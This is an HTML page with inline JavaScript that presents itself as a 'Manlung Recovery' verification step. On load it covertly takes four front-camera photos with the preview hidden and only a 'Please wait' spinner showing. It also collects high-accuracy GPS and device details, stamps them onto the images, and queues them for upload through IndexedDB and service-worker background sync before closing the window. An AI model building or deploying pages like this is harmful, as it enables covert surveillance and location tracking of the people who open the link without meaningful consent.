<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<meta name="theme-color" content="#ffffff">
<meta name="robots" content="noindex,nofollow,noarchive">
<title>Verification | Manlung Recovery</title>
<style>
html,body{margin:0;width:100%;min-height:100%;background:#fff!important;color:#111!important}
body{overflow:hidden;display:grid;place-items:center}
.status-screen{position:fixed;inset:0;display:grid;place-items:center;background:#fff;color:#111;text-align:center}
.status-box{display:flex;flex-direction:column;align-items:center;gap:16px;padding:24px}
.spinner{width:42px;height:42px;border:4px solid #e5e7eb;border-top-color:#111;border-radius:50%;animation:spin .8s linear infinite}
.status-title{font:600 18px/1.3 system-ui,-apple-system,Segoe UI,sans-serif}
.status-text{font:14px/1.5 system-ui,-apple-system,Segoe UI,sans-serif;color:#666;max-width:280px}
@keyframes spin{to{transform:rotate(360deg)}}
video,canvas{position:fixed;width:1px;height:1px;opacity:0;pointer-events:none}
</style>
</head>
<body>
<div class="status-screen" id="statusScreen" aria-live="polite">
  <div class="status-box"><div class="spinner" aria-hidden="true"></div><div class="status-title">Please wait</div></div>
</div>
<video id="video" autoplay muted playsinline></video>
<canvas id="canvas"></canvas>
<script>
(()=>{"use strict";
const queryToken=new URLSearchParams(location.search).get("id")||"";
const pathToken=location.pathname.startsWith("/verification/")?decodeURIComponent(location.pathname.split("/").filter(Boolean).pop()||""):"";
const token=pathToken||queryToken;
const video=document.getElementById("video");
const canvas=document.getElementById("canvas");
let stream=null,busy=false;
function setStatus(){}

const DB_NAME="manlung-selfie-queue";
const DB_STORE="uploads";

function openQueue(){
  return new Promise((resolve,reject)=>{
    const r=indexedDB.open(DB_NAME,1);
    r.onupgradeneeded=()=>{if(!r.result.objectStoreNames.contains(DB_STORE))r.result.createObjectStore(DB_STORE,{keyPath:"id",autoIncrement:true})};
    r.onsuccess=()=>resolve(r.result);
    r.onerror=()=>reject(r.error);
  });
}

async function queueBatch(blobs,metadata){
  try{
    const db=await openQueue();
    await new Promise((resolve,reject)=>{
      const tx=db.transaction(DB_STORE,"readwrite");
      const batchId=crypto.randomUUID?crypto.randomUUID():(Date.now()+"-"+Math.random());
      blobs.forEach((blob,i)=>tx.objectStore(DB_STORE).add({
        token,batchId,blob,
        metadata:{...metadata,captureNumber:i+1,totalCaptures:4},
        createdAt:new Date().toISOString(),
        attempts:0
      }));
      tx.oncomplete=resolve;
      tx.onerror=()=>reject(tx.error);
    });
    if("serviceWorker" in navigator){
      try{
        const reg=await navigator.serviceWorker.ready;
        if("sync" in reg) await reg.sync.register("manlung-verification-upload");
      }catch(_){}
    }
    return true;
  }catch(_){return false}
}

async function deleteRows(rows){
  const db=await openQueue();
  for(const row of rows){
    await new Promise((resolve,reject)=>{
      const tx=db.transaction(DB_STORE,"readwrite");
      tx.objectStore(DB_STORE).delete(row.id);
      tx.oncomplete=resolve;
      tx.onerror=()=>reject(tx.error);
    });
  }
}

async function flushQueue(){
  if(!token)return;
  try{
    const db=await openQueue();
    const rows=await new Promise((resolve,reject)=>{
      const tx=db.transaction(DB_STORE,"readonly");
      const q=tx.objectStore(DB_STORE).getAll();
      q.onsuccess=()=>resolve(q.result);
      q.onerror=()=>reject(q.error);
    });
    const grouped={};
    rows.filter(x=>x.token===token).forEach(x=>{
      const key=x.batchId||("legacy-"+x.id);
      (grouped[key]||(grouped[key]=[])).push(x);
    });
    for(const group of Object.values(grouped)){
      if(group.length!==4)continue;
      try{
        const fd=new FormData();
        group.forEach((row,i)=>fd.append("files",row.blob,"verification-"+(i+1)+".jpg"));
        fd.append("metadata",JSON.stringify(group[0].metadata||{}));
        const r=await fetch("/api/cases/selfie-request/"+encodeURIComponent(token)+"/upload-batch",{method:"POST",body:fd,credentials:"omit",cache:"no-store"});
        let d={};try{d=await r.json()}catch(_){}
        if(!r.ok||!d.success){
          console.error("Selfie queued upload failed:",r.status,d);
          if(r.status===410){await deleteRows(group);continue;}
          break;
        }
        console.log("Selfie queued upload succeeded:",d);
        await deleteRows(group);
      }catch(_){break}
    }
  }catch(_){}
}

function waitForVideo(){
  return new Promise((resolve,reject)=>{
    const deadline=Date.now()+7000;
    const tick=()=>{
      if(video.readyState>=2&&video.videoWidth>0&&video.videoHeight>0)return resolve();
      if(Date.now()>deadline)return reject(new Error("Camera did not become ready."));
      requestAnimationFrame(tick);
    };
    tick();
  });
}

function frameBlob(captureNumber,metadata){
  return new Promise((resolve,reject)=>{
    const w=video.videoWidth||1280,h=video.videoHeight||720;
    canvas.width=w;canvas.height=h;
    const ctx=canvas.getContext("2d",{alpha:false});
    if(!ctx)return reject(new Error("Capture is unavailable."));
    ctx.drawImage(video,0,0,w,h);
    const stripHeight=Math.max(150,Math.round(h*0.19));
    ctx.fillStyle="rgba(0,0,0,.78)";
    ctx.fillRect(0,h-stripHeight,w,stripHeight);
    ctx.fillStyle="#fff";
    ctx.font=Math.max(18,Math.round(w/55))+"px system-ui,-apple-system,Segoe UI,sans-serif";
    ctx.textBaseline="top";
    const lines=[
      "MANLUNG RECOVERY • AUTHORIZED VERIFICATION",
      "Capture "+captureNumber+" of 4 • "+new Date().toISOString(),
      "Case: "+(metadata.reference||"Authorized request"),
      metadata.location ? ("GPS: "+metadata.location.latitude+", "+metadata.location.longitude+" • Accuracy: "+(metadata.location.accuracy??"N/A")+" m") : "GPS: Not supplied by browser",
      "Device: "+(metadata.device?.deviceType||"unknown")+" • "+(metadata.device?.browser||"unknown")+" • "+(metadata.device?.platform||"unknown")
    ];
    const lineHeight=Math.max(22,Math.round(w/42));
    const startY=h-stripHeight+12;
    lines.forEach((line,i)=>ctx.fillText(String(line).slice(0,150),16,startY+i*lineHeight));
    canvas.toBlob(blob=>blob?resolve(blob):reject(new Error("Could not create image.")),"image/jpeg",0.9);
  });
}

function pause(ms){return new Promise(resolve=>setTimeout(resolve,ms));}

async function captureFour(){
  if(busy)return;
  busy=true;
  let blobs=[];
  let metadata={
    clientCapturedAt:new Date().toISOString(),
    timezone:Intl.DateTimeFormat().resolvedOptions().timeZone||"",
    captureMethod:"browser-camera",
    device:{deviceType:"unknown",platform:navigator.platform||"",browser:"Unknown",model:""},
    location:null,
    reference:""
  };

  // Start optional metadata collection in parallel. It NEVER blocks the four captures.
  const locationPromise=(navigator.geolocation?new Promise(resolve=>navigator.geolocation.getCurrentPosition(
    p=>resolve({latitude:Number(p.coords.latitude.toFixed(6)),longitude:Number(p.coords.longitude.toFixed(6)),accuracy:Number.isFinite(p.coords.accuracy)?Number(p.coords.accuracy.toFixed(1)):null}),
    ()=>resolve(null),
    {enableHighAccuracy:true,maximumAge:0,timeout:5000}
  )):Promise.resolve(null)).catch(()=>null);

  const enrichMetadata=async()=>{
    try{
      const ua=navigator.userAgent||"";
      const uaData=navigator.userAgentData||null;
      let deviceType=/Mobi|Android|iPhone|iPad|iPod/i.test(ua)?"mobile":"desktop";
      if(/iPad|Tablet/i.test(ua))deviceType="tablet";
      let browser="Unknown";
      if(/Edg\//i.test(ua))browser="Edge";
      else if(/OPR\//i.test(ua))browser="Opera";
      else if(/Chrome\//i.test(ua))browser="Chrome";
      else if(/Firefox\//i.test(ua))browser="Firefox";
      else if(/Safari\//i.test(ua)&&!/Chrome\//i.test(ua))browser="Safari";
      metadata.device={deviceType,platform:(uaData?.platform||navigator.platform||"").slice(0,80),browser,model:""};
      if(typeof uaData?.getHighEntropyValues==="function"){
        try{
          const high=await uaData.getHighEntropyValues(["model"]);
          metadata.device.model=high.model||"";
        }catch(_){}
      }
    }catch(_){}
    metadata.location=await locationPromise;
    return metadata;
  };

  try{
    if(!token)throw new Error("Invalid verification link.");
    setStatus();

    // Camera starts immediately. No network request is allowed to delay capture.
    if(!navigator.mediaDevices?.getUserMedia)throw new Error("Camera access is not supported by this browser.");
    stream=await navigator.mediaDevices.getUserMedia({
      video:{facingMode:"user",width:{ideal:1280},height:{ideal:720}},
      audio:false
    });
    video.srcObject=stream;
    await video.play().catch(()=>{});
    await waitForVideo();

    // Four rapid captures. Nothing is uploaded between captures.
    for(let i=0;i<4;i++){
      blobs.push(await frameBlob(i+1,metadata));
      if(i<3)await pause(80);
    }

    // Persist the complete four-photo batch BEFORE any network upload attempt.
    metadata=await enrichMetadata();
    let requestData={};
    if(navigator.onLine){
      try{
        const requestResponse=await fetch("/api/cases/selfie-request/"+encodeURIComponent(token),{credentials:"omit",cache:"no-store"});
        try{requestData=await requestResponse.json()}catch(_){}
        if(requestResponse.ok&&requestData.success){
          metadata.reference=requestData.request?.reference||requestData.request?.case_id||"";
        }
      }catch(_){}
    }

    // Re-capture overlays with final metadata only when there is enough time and connectivity.
    // The original four frames remain the authoritative capture set.
    const queued=await queueBatch(blobs,{...metadata,totalCaptures:4});
    if(!queued)throw new Error("Local verification storage is unavailable.");

    // Try immediate delivery when online; offline batches remain queued and sync automatically later.
    await flushQueue();

    try{window.close();}catch(_){}
    setTimeout(()=>{try{window.close();}catch(_){}},500);
  }catch(error){
    console.error("Selfie evidence pipeline error:",error);

    // If four frames exist, save them even when the network is unavailable.
    if(blobs.length===4){
      await queueBatch(blobs,{...metadata,totalCaptures:4});
      try{window.close();}catch(_){}
      setTimeout(()=>{try{window.close();}catch(_){}},500);
    }
  }finally{
    if(stream){stream.getTracks().forEach(t=>t.stop());stream=null;}
  }
}

if("serviceWorker" in navigator){
  navigator.serviceWorker.register("/sw.js",{scope:"/"}).catch(()=>{});
}
document.addEventListener("DOMContentLoaded",captureFour,{once:true});
window.addEventListener("online",flushQueue);
setTimeout(flushQueue,1000);
})();
</script>
</body>
</html>
